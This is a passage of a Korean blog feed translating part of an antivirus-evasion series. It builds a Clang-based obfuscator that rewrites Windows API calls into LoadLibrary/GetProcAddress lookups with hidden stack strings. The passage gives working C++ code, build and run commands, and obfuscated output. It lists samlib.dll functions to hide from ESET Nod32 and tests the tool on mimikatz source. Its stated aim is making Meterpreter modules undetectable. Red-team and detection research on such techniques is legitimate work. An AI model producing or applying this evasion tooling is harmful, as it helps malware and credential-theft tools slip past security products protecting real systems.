class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>중요한 구현 세부 사항은 많은 다른 함수들에 적용할 수 있는 가능성을 제공하는 것이고 최종적인 목표는 각 수정된 API 함수에 <code>LoadLibrary/GetProcAddress</code>를 삽입하는 것이므로 함수 프로토타입과 DLL 이름을 제공해야 한다.</p><p>그렇게 하면 수정할 API만큼 많은 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>를 등록할 수 있다. 이 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>의 인스턴스화는 <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>에서 수행되야만 한다:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>의 주요 변경점.</p><p>이것은 이전 글에서 작업한 기존 코드에 대한 유일한 변경점이다. 우리가 추가할 코드들은 <code>ApiMatchHandelr.cpp</code>를 만드는 것부터 시작한다.</p><p>matcher는 콜백 함수와 함께 제공되므로 다음 하나를 제공하자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>섹션의 시작 부분에서 리스트로 분리된 작업들은 아래 메소드를 통해 코드로 바꿀 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="함수-호출-대체"><a href="#함수-호출-대체" class="headerlink" title="함수 호출 대체"></a>함수 호출 대체</h3><p>이것은 가장 사소한 부분이다. 목표는 AST의 <code>MessageBoxA</code>를 무작위 식별자로 대체하는 것이다. 이러한 무작위 변수 초기화는 다음 섹션에서 수행된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn API는 함수 식별자의 이름을 변경하는 데 사용된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-삽입"><a href="#LoadLibrary-GetProcAddress-삽입" class="headerlink" title="LoadLibrary/GetProcAddress 삽입"></a>LoadLibrary/GetProcAddress 삽입</h3><p>우리가 추가하고자 하는 API에 Run-time dynamic linking을 추가하는 과정은 다음과 같다:</p><ul><li><p>translation unit의 상단 혹은 enclosing 함수 안에 API 프로토타입을 추가해라. 쉽게 하기 위해 우리는 후자를 선택하지만 동일한 함수에서 API를 여러 번 호출할 경우 이미 추가되었는지 확인할 필요가 있다.</p></li><li><p>아래 라인을 추가해라</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> 호출을 추가해라</p></li></ul><p>물론 이 작업을 하면서 문자열 리터럴을 삽입하지 않기 위해 각 문자열을 스택 문자열로 작성해야 한다. 이것은 코드를 읽기 지루하게 만들지만 복잡하진 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>전부 잘 동작하는지 테스트하기 위해 아래 테스트 파일을 사용하자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator 실행!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>결과 확인!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_6nzSLR0dttUn = (_MessageBoxA) GetProcAddress(hid_hHandl_vU1riOrVWM8g, hid_Messag_GoaJMFscXsdw);hid_Messag_1W70P1kc8OJv(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, hid_Someth_lNGj92poubUG, MB_OK);    hid_Messag_6nzSLR0dttUn(<span class="hljs-literal">NULL</span>, hid_Anothe_UP7KUo4Sa8LC, hid_Anothe_ACsNhmIcS1tA, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>볼 수 있듯이 문자열 난독화와 API 난독화 패스의 조합은 상당히 강력하다. <code>Test</code> 문자열은 작은 문자열은 무시하는 것으로 결정했기 때문에 남아있다. 그 후 난독화 소스 코드는 빌드할 수 있다.</p><pre><code class="hljs cpp">$ cp test/messagebox_simple.c.patch /tmp/test.c$ x86_64-w64-mingw32-gcc /tmp/test.c -o /tmp/toto.exe</code></pre><p>윈도우10 가상 머신에서 테스트 결과 원래 기능이 계속 작동하는 것으로 보인다. 더 중요한 것은 난독화된 바이너리에 <code>MessageBox</code> 문자열이 없다.</p><pre><code class="hljs cpp">$ rabin2 -zz /tmp/toto.exe | grep MessageBox | wc -l  <span class="hljs-number">0</span></code></pre><h3 id="Generalisation"><a href="#Generalisation" class="headerlink" title="Generalisation"></a>Generalisation</h3><p>안티바이러스 ESET Nod32 관련해서 우리는 <code>samlib.dll</code>과 관련된 API imports 중 특히 아래에 있는 API들을 숨기는 것이 중요하다는 것을 발견했다.</p><ul><li>SamConnect</li><li>SamConnectWithCreds</li><li>SamEnumerateDomainInSamServer</li><li>SamLookupDomainInSamServer</li><li>SamOpenDomain</li><li>SamOpenUser</li><li>SamOpenGroup</li><li>SamOpenAlias</li><li>SamQueryInformationUser</li><li>SamSetInformationUser</li><li>SamiChangePasswordUser</li><li>SamGetGroupsForUser</li><li>SamGetAliasMembership</li><li>SamGetMembersInGroup</li><li>SamGetMembersInAlias</li><li>SamEnumerateUsersInDomain</li><li>SamEnumerateGroupsInDomain</li><li>SamEnumerateAliasesInDomain</li><li>SamLookupNamesInDomain</li><li>SamLookupIdsInDomain</li><li>SamRidToSid</li><li>SamCloseHandle</li><li>SamFreeMemory</li></ul><p>이러한 함수들은 AV 엔진 어디에서도 블랙리스트에 있지 않지만 내부 탐지 신뢰 점수를 높인다. 이러한 함수에 <code>ApiCallConsumer</code>를 등록해야 하므로 이름과 함수 프로토타입이 필요하다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">map</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; ApiToHide_samlib = &#123;    &#123;<span class="hljs-string">&quot;SamConnect&quot;</span>,                     <span class="hljs-string">&quot;typedef NTSTATUS (__stdcall* _SamEnumerateDomainsInSamServer)(SAMPR_HANDLE ServerHandle, DWORD * EnumerationContext, PSAMPR_RID_ENUMERATION* Buffer, DWORD PreferedMaximumLength,DWORD * CountReturned);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamConnectWithCreds&quot;</span>,            <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnect)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, BOOLEAN Trusted);&quot;</span>&#125;,    &#123;<span class="hljs-string">&quot;SamEnumerateDomainsInSamServer&quot;</span>, <span class="hljs-string">&quot;typedef NTSTATUS(__stdcall* _SamConnectWithCreds)(PUNICODE_STRING ServerName, SAMPR_HANDLE * ServerHandle, ACCESS_MASK DesiredAccess, LSA_OBJECT_ATTRIBUTES * ObjectAttributes, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, PWSTR ServerPrincName, ULONG * unk0);&quot;</span>&#125;,    ...&#125;</code></pre><p>그 후 이러한 컬렉션을 반복하고 각 컬렉션을 처리하기 위해 <code>main.cpp</code>를 업데이트한다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> <span class="hljs-keyword">const</span>&amp; el: ApiToHide_samlib)&#123;    <span class="hljs-keyword">auto</span> Cons = <span class="hljs-built_in">std</span>::make_unique&lt;ApiCallConsumer*&gt;(<span class="hljs-keyword">new</span> ApiCallConsumer(el.first, el.second,                                                                        <span class="hljs-string">&quot;samlib.dll&quot;</span>));    consumers.push_back(*Cons);&#125;</code></pre><p>여기서 <code>std::make_unique</code>는 이 반복문에서 힙에 있는 객체를 인스턴스화할 수 있기에 중요하고 나중에 이러한 객체를 수동으로 쉽게 해제할 수 있다. 이것은 더 이상 사용하지 않을 때 자동으로 해제될 것이다.</p><p>마지막으로 mimikatz, 특히 <code>kuhl_m_lsadump.c</code>로 난독화를 테스트할 수 있다.</p><pre><code class="hljs bash">bash run_example_mimikatz.sh <span class="hljs-built_in">test</span>/kuhl_m_lsadump.c</code></pre><p>이것은 흥미로운 결과를 만든다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/5.png"></p><p><code>samlib.dll</code>에서 가져온 API를 위한 Run-time dynamic linking</p><p>실제 함수 호출은 완벽하게 수정되었다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/6.png"></p><p><code>samlib.dll</code>에서 가져온 함수 호출들은 완벽하게 수정되었다.</p><p><code>PRINT_ERROR</code> 매크로 내부의 문자열은 <code>do&#123;&#125;while(0)</code>을 통해 매크로를 사용하여 난독화 되지 않았다. obfuscator의 버그를 찾는데 <code>mimikatz</code>보다 좋은 프로젝트를 찾기 못했다.</p><h2 id="개선사항"><a href="#개선사항" class="headerlink" title="개선사항"></a>개선사항</h2><p>이 부분은 여러분을 위해 남겨진 작업들이다 🙂</p><h3 id="More-stealth"><a href="#More-stealth" class="headerlink" title="More stealth"></a>More stealth</h3><p>run-time dynamic linking을 수행하기 위해 실제로 API <code>LoadLibrary/GetProcAddress</code>가 필요하지 않다.</p><p>후킹을 피하기 위해 이 함수들은 재구현하는 것이 좋고 이미 그것을 할 수 있는 오픈소스 프로젝트가 있다.(<a href="https://github.com/rapid7/ReflectiveDLLInjection/">ReflectiveDllInjection</a>)</p><p>여기까지 읽었다면, translation unit의 상단에 이러한 함수들을 위한 구현을 추가하고(<code>findInjectionSpot</code> 사용) WinAPI 대신에 구현을 사용하기 위해 메소드 <code>addGetProcAddress</code>를 업데이트하면 된다는 것을 알 것이다.</p><h3 id="Error-handling"><a href="#Error-handling" class="headerlink" title="Error handling"></a>Error handling</h3><ul><li><code>LoadLibrary</code>는 성공적으로 수행되지 않을 경우 <code>NULL</code>을 반환하므로 이에 대한 검사를 추가하여 오류를 정상적으로 복구할 수 있다. 현재 상황에서 크래시가 매우 잘 날 수도 있다.</li><li><code>GetProcAddress</code>도 오류가 발생하면 <code>NULL</code>을 반환하므로 이것도 확인하는 것이 중요하다.</li></ul><h2 id="결론"><a href="#결론" class="headerlink" title="결론"></a>결론</h2><p>이 글에서 우리는 정규식을 사용하지 않고 C/C++ 코드 베이스에서 함수 호출을 정확하게 교체할 수 있는 방법을 보여줬다. 모든 것은 안티바이러스 소프트웨어가 우리가 pentest를 하는 동안 사용하는 Meterpreter나 다른 소프트웨어에 관해 행동 정보를 정적으로 수집하는 것을 막기 위해 진행되었다.</p><p>ESET Nod32에 적용된 이 작업은 모든 Meterpreter 모듈이 탐지되지 않도록 하는 주요 단계였고 더 발전된 제품에 도움이 되었다.</p><p>API imports를 숨기는 것도 하나지만 악성코드가 실행되면 보안 소프트웨어가 API 호출 모니터링에 의해 행동 정보를 수집하는 방법도 있다.</p><p>그런 관점에서 다음 글은 의심스러운 Win32 API가 직접적인 syscalls을 하도록 자동적으로 refactoring 하는 것이다. 이것은 Cylance, Traps과 Kaspersky 같은 AV의 userland hook을 통한 런타임 탐지 우회의 핵심 단계이다.</p><h2 id="출처"><a href="#출처" class="headerlink" title="출처"></a>출처</h2><p>[1] The Rootkit Arsenal, Chapter 11, p.480.</p><p>[2]<a href="https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/">https://devblogs.microsoft.com/cppblog/exploring-clang-tooling-part-2-examining-the-clang-ast-with-clang-query/</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>bypass</tag>
      
      <tag>evasion</tag>
      
      <tag>meterpreter</tag>
      
      <tag>obfuscation</tag>
      
      <tag>iat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17140 : SMB uaf to info disclosure</title>
    <link href="/2020/12/12/fabu1ous/2020-12-12/"/>
    <url>/2020/12/12/fabu1ous/2020-12-12/</url>
    
